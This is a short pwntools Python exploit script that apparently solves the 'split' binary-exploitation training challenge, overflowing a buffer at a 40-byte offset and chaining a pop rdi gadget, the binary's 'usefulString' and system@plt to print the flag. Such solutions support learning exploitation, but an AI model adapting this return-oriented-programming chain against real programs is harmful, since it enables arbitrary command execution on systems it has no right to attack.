#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'split')

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def split():
    offset = 40
    pop_rdi = 0x00000000004007c3 # pop rdi; ret; 
    ret = 0x000000000040053e # ret; 

    payload = flat({
        offset: [
            pop_rdi,
            exe.sym['usefulString'],
            ret,
            exe.plt['system']
        ]
    })

    io.sendline(payload)
    io.recvuntil('you!')
    io.recvline()
    flag = io.recv(1024).decode()
    info(f"Flag: {flag}")

    io.close()

def main():
    
    init()
    split()

if __name__ == '__main__':
    main()

